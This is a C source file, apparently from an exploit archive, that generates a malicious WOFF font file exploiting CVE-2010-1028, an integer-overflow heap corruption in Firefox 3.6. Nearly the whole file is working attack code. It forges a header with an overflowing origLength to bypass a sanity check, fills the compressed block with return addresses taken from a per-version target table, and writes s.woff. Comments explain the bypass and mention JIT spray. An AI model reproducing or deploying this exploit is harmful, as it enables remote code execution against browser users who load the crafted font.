#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

/*
	x90c WOFF 1day exploit

	(MFSA2010-08 WOFF Heap Corruption due to Integer Overflow 1day exploit)

	CVE-ID: CVE-2010-1028

	Full Exploit: http:/www.exploit-db.com/sploits/27698.tgz

    Affacted Products:
        - Mozilla Firefox 3.6 ( Gecko 1.9.2 )
        - Mozilla Firefox 3.6 Beta1, 3, 4, 5 ( Beta2 ko not released )
        - Mozilla Firefox 3.6 RC1, RC2

    Fixed in:
 	    - Mozilla Firefox 3.6.2 ( after 3.6 version this bug fixed )
 
    security bug credit: Evgeny Legerov < intevydis.com >
 
    Timeline:
 	 	2010.02.01 - Evengy Legerov Initial discovered and shiped it into
  					 "Immunity 3rd Party Product VulnDisco 9.0"
  					 https://forum.immunityinc.com/board/thread/1161/vulndisco-9-0/
  		2010.02.18 - without reporter, it self analyzed
  					 and contact to mozilla and secunia before advisory reporting
  					 http://secunia.com/advisories/38608
  		2010.03.19 - CVE registered
  					 http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-1028
  		2010.03.22 - Mozilla advisory report
  					 http://www.mozilla.org/security/announce/2010/mfsa2010-08.html
  		2010.04.01 - x90c exploit (x90c.org)
 
    Compile:
    [root@centos5 woff]# gcc CVE-2010-1028_exploit.c -o CVE-2010-1028_exploit -lz


	rebel: greets to my old l33t hacker dude in sweden
	... BSDaemon: and Invitation of l33t dude for exploit share
	#phrack@efnet, #social@overthewire


    x90c 
	
*/

typedef unsigned int    UInt32;
typedef unsigned short  UInt16;

/*
    for above two types, some WOFF header struct uses big-endian byte order.
*/

typedef struct
{
    UInt32  signature;
    UInt32  flavor;
    UInt32  length;
    UInt16  numTables;
    UInt16  reserved;
    UInt32  totalSfntSize;
    UInt16  majorVersion;
    UInt16  minorVersion;
    UInt32  metaOffset;
    UInt32  metaLength;
    UInt32  metaOrigLength;
    UInt32  privOffset;
    UInt32  privLength;
} WOFF_HEADER;  

typedef struct 
{
    UInt32  tag;
    UInt32  offset;
    UInt32  compLength;
    UInt32  origLength;
    UInt32  origChecksum;
} WOFF_DIRECTORY; 

#define FLAVOR_TRUETYPE_FONT    0x0001000
#define FLAVOR_CFF_FONT         0x4F54544F

struct ff_version
{
	int num;
	char *v_nm;
	unsigned long addr;
};

struct ff_version plat[] =
{
{
	0, "Win XP SP3 ko - FF 3.6", 0x004E18ED
},
{
	1, "Win XP SP3 ko - FF 3.6 Beta1", 0x004E17BD
},
{
	2, "Win XP SP3 ko - FF 3.6 Beta3", 0x004E193D
},
{
	3, "Win XP SP3 ko - FF 3.6 Beta4", 0x004E20FD
},
{
	4, "Win XP SP3 ko - FF 3.6 Beta5", 0x600A225D
},
{
	5, "Win XP SP3 ko - FF 3.6 RC1", 0x004E17BD
},
{
	6, "Win XP SP3 ko - FF 3.6 RC2", 0x004E18ED
},
{
	0x00, NULL, 0x0
}
};

void usage(char *f_nm)
{
	int i = 0;

	fprintf(stdout, "\n Usage: %s [Target ID]\n\n", f_nm);
	
	for(i = 0; plat[i].v_nm != NULL; i++)
		fprintf(stdout, "\t{%d} %s. \n", (plat[i].num), (plat[i].v_nm));

	exit(-1);
}

int main(int argc, char *argv[]) {
    WOFF_HEADER    woff_header;
    WOFF_DIRECTORY woff_dir[1];
	FILE *fp;
	char dataBlock[1024];
    char compressed_dataBlock[1024];
    char de_buf[1024];
    int total_bytes = 0, total_dataBlock = 0;	
	unsigned long destLen = 1024;
    unsigned long de_Len = 1024;
    unsigned long i = 0;
	unsigned long addr_saved_ret_val = 0;
	int ret = 0;
    int n = 0;

	if(argc < 2)
		usage(argv[0]);

	n = atoi(argv[1]);

	if(n < 0 || n > 6)
	{
		fprintf(stderr, "\nTarget number range is 0-6!\n");
		usage(argv[0]);
	}

    printf("\n#### x90c WOFF exploit ####\n");
    printf("\nTarget: %d - %s\n\n", (plat[n].num), (plat[n].v_nm));

    // WOFF HEADER
    woff_header.signature = 0x46464F77;			// 'wOFF' ( L.E )
    woff_header.flavor = FLAVOR_TRUETYPE_FONT;  // sfnt version ( B.E )
    woff_header.length = 0x00000000;			// woff file total length ( B.E )
    woff_header.numTables = 0x0100;				// 0x1 - woff dir entry length ( B.E )
    woff_header.reserved = 0x0000;				// res bit ( all zero )

    // totalSFntSize value will bypass validation condition after integer overflow
    woff_header.totalSfntSize = 0x1C000000;		// 0x0000001C ( B.E )
    woff_header.majorVersion = 0x0000;			// major version
    woff_header.minorVersion = 0x0000;			// minor version
	woff_header.metaOffset = 0x00000000;		// meta data block offset ( not used )
    woff_header.metaLength = 0x00000000;		// meta data block length ( not used )
    woff_header.metaOrigLength = 0x00000000;    // meta data block before-compresed length ( not used )
    woff_header.privOffset = 0x00000000;		// Private data block offset ( not used )
    woff_header.privLength = 0x00000000;		// Private data block length

    woff_dir[0].tag = 0x54444245;				// 'EBDT' ( B.E )
    woff_dir[0].offset = 0x40000000;			// 0x00000040 ( B.E )
    woff_dir[0].compLength = 0x00000000;		// ( B.E )

    // to trigger field bit.
	// 0xFFFFFFF8-0xFFFFFFFF value to trigger integer overflow.
    // 1) calculation result is 0, it's bypass to sanityCheck() function
    // 2) passed very long length into zlib Decompressor, it's trigger memory corruption!

    // 0xFFFFFFFD-0xFFFFFFFF: bypass sanityCheck()
    // you can use only the value of 0xFFFFFFFF ( integer overflow!!! )
    // you can't using other values to bypass validation condition
    woff_dir[0].origLength = 0xFFFFFFFF;		// 0xFFFFFFFF ( B.E )

    printf("WOFF_HEADER     [ %d bytes ]\n", sizeof(WOFF_HEADER));
    printf("WOFF_DIRECTORY  [ %d bytes ]\n", sizeof(WOFF_DIRECTORY));

    // to compress data block
    // [ 0x0c0c0c0c 0x0c0c0c0c 0x0c0c0c0c ... ]
	// ...JIT spray stuff...

	addr_saved_ret_val = plat[n].addr;
	addr_saved_ret_val += 0x8;	// If add 8bytes it reduced reference error occurs

    for(i = 0; i < sizeof(dataBlock); i+=4)	// 0x004E18F5
    {
        dataBlock[i+0] = (addr_saved_ret_val & 0x000000ff);
        dataBlock[i+1] = (addr_saved_ret_val & 0x0000ff00) >> 8;
        dataBlock[i+2] = (addr_saved_ret_val & 0x00ff0000) >> 16;
        dataBlock[i+3] = (addr_saved_ret_val & 0xff000000) >> 24;
    }

    // compress dataBlock with zlib's compress()
    if(compress((Bytef *)compressed_dataBlock, 
                 (uLongf *)&destLen,
                 (Bytef *)dataBlock,
                 (uLong)(sizeof(dataBlock))
                 ) != Z_OK)
    {
        fprintf(stderr, "Zlib compress failed!\n");
        exit(-1);
    }
    
    printf("\nZlib compress(dataBlock) ...\n");
    printf("DataBlock                   [ %u bytes ]\n", sizeof(dataBlock));
    printf("Compressed DataBlock        [ %u bytes ]\n", destLen);
    printf("[ Z_OK ]\n\n");

    total_bytes = sizeof(WOFF_HEADER) +
                  sizeof(WOFF_DIRECTORY) +
                  destLen;

    total_dataBlock = destLen;

    printf("Total WOFF File Size: %d bytes\n", total_bytes);
	
    // byte order change to total_bytes, total_dataBlock ( L.E into B.E )
    total_bytes = 
        ((total_bytes & 0xff000000) >> 24) |
        ((total_bytes & 0x00ff0000) >> 8) |
        ((total_bytes & 0x0000ff00) << 8) |
        ((total_bytes & 0x000000ff) << 24);
    woff_header.length = total_bytes;

    total_dataBlock =
        ((total_dataBlock & 0xff000000) >> 24) |
        ((total_dataBlock & 0x00ff0000) >> 8) |
        ((total_dataBlock & 0x0000ff00) << 8) |
        ((total_dataBlock & 0x000000ff) << 24);

    woff_dir[0].compLength = total_dataBlock;

	// create attack code data
    if((fp = fopen("s.woff", "wb")) < 0)
    {
        fprintf(stderr, "that file to create open failed\n");
        exit(-2);
    }

    // setup WOFF data store
    fwrite(&woff_header, 1, sizeof(woff_header), fp);
    fwrite(&woff_dir[0], 1, sizeof(woff_dir[0]), fp);
    fwrite(&compressed_dataBlock, 1, destLen, fp);

    fclose(fp);

	// zlib extract test
    ret = uncompress(de_buf, &de_Len, compressed_dataBlock, destLen);
	if(ret != Z_OK)
	{
		switch(ret)
		{
			case Z_MEM_ERROR:
                printf("Z_MEM_ERROR\n");		
                break;
	        case Z_BUF_ERROR:
                printf("Z_BUF_ERROR\n");
                break;
	        case Z_DATA_ERROR:
		        printf("Z_DATA_ERROR\n");
                break;
		}

		fprintf(stderr, "Zlib uncompress test failed!\n");
		unlink("./s.woff");
        exit(-3);
	}

    printf("\nZlib uncompress test(compressed_dataBlock) ...\n");
    printf("[ Z_OK ]\n\n");

	return 0;
}

/* eof */